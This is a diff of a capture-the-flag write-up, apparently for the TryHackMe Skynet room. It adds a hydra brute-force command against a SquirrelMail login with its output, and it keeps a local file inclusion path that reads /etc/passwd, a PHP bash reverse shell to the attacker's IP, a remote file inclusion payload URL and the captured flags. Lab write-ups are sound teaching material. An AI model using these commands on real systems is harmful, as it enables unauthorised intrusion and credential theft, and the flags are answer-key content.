@@ -219,8 +219,32 @@ Squirrelmail seemed worth a look so tried in the browswer and there was a login 
   	- used milesdyson as the username as its likely same name for email account
   	- Then just one sniper attack on the one variable
   	- The password was found in the list. Its listed twice.
-
+ 
 Answer Q1: cyborg007haloterminator
+
+Alternatively hydra did work, perfect one with only short list log1.txt:
+
+Since the login page sends a POST request for login, from looking at source code:
+```
+...
+<form action="redirect.php" method="post" name="login_form"  >
+...
+```
+User name field variable : login_username
+Password field variable : secretkey
+Failed attempt sign found in title '<title>SquirrelMail - Unknown user or password incorrect.</title>'
+http-post-form format : <path>:<POST data>:<failure string>
+
+# hydra -l milesdyson -P log1.txt THM_Target http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-10 07:52:52
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
+[DATA] attacking http-post-form://THM_Target:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect
+[80][http-post-form] host: THM_Target   login: milesdyson   password: cyborg007haloterminator
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-10 07:52:57
+
 
 ## Q2 What is the hidden directory?
 
@@ -254,10 +278,13 @@ containing:
 1. Add features to beta CMS /45kra24zxs28v3yd
 2. Work on T-800 Model 101 blueprints
 3. Spend more time with my wife
-Answer: /45kra24zxs28v3yd is the hidden directory
+
+Answer Q2: /45kra24zxs28v3yd is the hidden directory
+
 
 ## Q3 What is the vulnerability called when you can include a remote file for malicious purposes?
-Answer: Remote File Inclusion
+
+AnswerQ3: Remote File Inclusion
 
 This is literally a clue for the next step, gobuster search into directory finds a directory called /administrator. A quick search with browser shows THM_Target/administrator/ presents us with the Cuppa CMS login page, based on text above login section "Use a valid username and password to gain access to the administrator". Clearly meant to be an administrative access point. 
 
@@ -329,10 +356,12 @@ Starting gobuster in directory enumeration mode
 /components           (Status: 301) [Size: 344] [-->...
 /classes              (Status: 301) [Size: 341] [-->...
 ```
+
 So exploit is modifeid given what was present.
 ```
 http://THM_Target/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 ```
+
 This successfully downloads the full passwd file, changing passwd to shadows blank page indicating not at root user access privilege.
 
 For remote file inclusion we can upload a reverse shell, using a PHP file. for a PHP file to be executable and to run a bash script inside:
@@ -341,16 +370,18 @@ For remote file inclusion we can upload a reverse shell, using a PHP file. for a
 exec("/bin/bash -c 'command1; command2; command3'");
 ?>
 ```
-using a simple reverse shell:
+
+Using a simple reverse shell:
 ```
 <?php exec ("/bin/bash -c 'bash -i >& /dev/tcp/<AttackBoxIP>/443 0>&1'");?>
 ```
+
 Then uploading using a simple python http server and calling the script by changing urlconfig line:
 ```
 urlConfig=http://<AttackBoxIP>:443/shell.php
 ```
-A reverse shell is connected and flag is obtained:
 
+A reverse shell is connected and flag is obtained:
 ```
 www-data@skynet:/var/www/html/45kra24zxs28v3yd/administrator/alerts$ cd /home/milesdyson
 www-data@skynet:/home/milesdyson$ ls
@@ -362,16 +393,19 @@ www-data@skynet:/home/milesdyson$ cat user.txt
 7ce5c2109a40f958099283600a9ae807
 www-data@skynet:/home/milesdyson$
 ```
+
 Answer for Q4: 7ce5c2109a40f958099283600a9ae807
 And note access here is with permissions of www-data, common for a online resource.
 
 ## Q5 What is the root flag?
+
 Next escalation required to access the root directory.
 To upgrade the reverse shell in place the SKYNET server hear cannot handle much more than
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
 ```
+
 I tried this after I tried this method which failed horribly resulting in disconnection of netcat in background.
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
